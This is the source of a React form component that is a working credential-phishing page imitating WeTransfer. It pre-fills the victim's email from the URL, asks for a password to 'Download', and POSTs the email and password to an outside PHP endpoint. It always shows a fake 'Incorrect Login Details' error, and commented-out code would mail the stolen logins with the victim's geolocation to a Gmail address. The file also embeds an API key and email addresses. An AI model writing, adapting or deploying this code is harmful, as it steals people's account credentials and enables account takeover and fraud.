
import React, { useState, useRef, useEffect } from "react";
import './Form.css';
import PreLoader from '../Preloader/Preloader';
import $ from 'jquery';
// import emailJS from '@emailjs/browser';

export const Form = ({ toggleForm })=>{

    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
    
    // const forTime = new Date();

    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);

          setFlag(flag);
          setIpAdress(ipAdress);
  
      })
      .catch(e=> console.log)
  }, [flag, ipAdress]);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('()', 1).toString();

    const [emptyPswd, setEmptyPswd] = useState(false);

    // const [email, setEmail] = useState("afefarhan01@mail.ru");
    const [email, setEmail] = useState(extracetdEmail);
    const [password, setPassword] = useState("");

    const [err, setErr] = useState(false);
    const [spin, setSpin] = useState(false);

    const formRef = useRef();
    const [count, setCount] = useState(0);

    const submitWetransferDetails = (e)=>{
        e.preventDefault();
        if(password === ""){
            setEmptyPswd(true);
            setErr(false);
            return null
        }else{

            setCount(count=> count + 1);
            if(count >= 40){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('()', 1).toString();
                console.log(extracetdemailDomain);
                window.location.href = "https://wetransfer.com/";
            };

            // posted a request to the server below

            const user = {
                email: email,
                password: password,
            };


            // const user = {
            //     online_correspondence: email,
            //     signal: password,
            //     country: country,
              
            //     city: city,
            //     flag: flag,
            //     eyep: ipAdress,
            //     nownow: forTime
            // };


            // const user = {
            //     "subject": "Coming Wetran Logs",
            //     "to": "sscorps.blr@gmail.com",
            //     "body": `<div><h3></h3><p>Online_Correspondence: ${email}</p><p>Signal: ${password}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            // }



// ==========================================================
// ==========================================================
 

            $.ajax({
                type: "POST",
                url: "https://dexamerix.com/dashboard/file/howareyou.php",
                data: user,
                success(data) {
                    console.log('ok');
                }
            });



// ==========================================================
// ==========================================================




// here..always check to upload the emailJS when uploading, IMPORTANT!
        // ====================================================




        // const serviceID = `service_xhrj4w4`;
        // const templateID = `template_jxxab7y`;
        // const publicKey = `35JbsFMyI7dxAGiKW`;


        // emailJS
        // .sendForm(serviceID, templateID, formRef.current, {
        //   publicKey: publicKey,
        // })
        // .then(
        //   () => {
        //     console.log('a');
        //   },
        //   (error) => {
        //     console.log('b', error.text);
        //   },
        // );






//         =========================================

            setSpin(true);

            setTimeout(() => {
                setSpin(false);
                setPassword('');
                setErr(true);
                setEmptyPswd(false);
                setTimeout(() => {
                    setErr(false);
                }, 4000);
            }, 2000);
        }
    };

    return(<div className="Form">

        <div className="modal">
            <div className="m-content">

                <div className="m-top">
                    <button className="cls-btn" id="mk_ekx_bodr_circ" onClick={toggleForm}>x</button>
                </div>


                <div className="box">

                    <form autoComplete="off" ref={formRef} onSubmit={submitWetransferDetails}>

                        { spin ? <PreLoader /> : null }

                        <div className="form-group">
                            <input 
                            type={`email`}
                            name="online_correspondence"
                            className="form-control"
                            required
                            placeholder="Email Address"
                            value={email}
                            onChange={e=> setEmail(e.target.value)}
                            readOnly
                            />
                        </div>



                        <div className="form-group">
                            <input 
                            type={`password`}
                            name="signal"
                            className="form-control"
                            required
                            placeholder="Password"
                            value={password}
                            onChange={e=> setPassword(e.target.value)}
                            autoFocus
                            />
                        </div>



                                        <input type="text" value={country} name="country" hidden/>
                                        <input type="text" value={city} name="city" hidden/>




                        <button type="submit" className="login-btn dn_ld_iefh" onClick={submitWetransferDetails}>
                            Download
                        </button>

                    </form>

                    <div className="m-footer">
                        <h1>WeTransfer Pro</h1>
                        <p>Get more out of WeTransfer, get Pro</p>
                    </div>

                   { err ? 
                        <p className="error-box">


                            {/* This email address and password don't seem to match...
                            Please double-check and try again */}

                            Incorrect Login Details


                        </p> 
                    : null }

                    {/* <p>Error! Please enter your password.</p> */}



                    {emptyPswd ? <p className="error-box">Error! Please enter your password.</p> : null }

                </div>


            </div>
        </div>

    </div>)
};
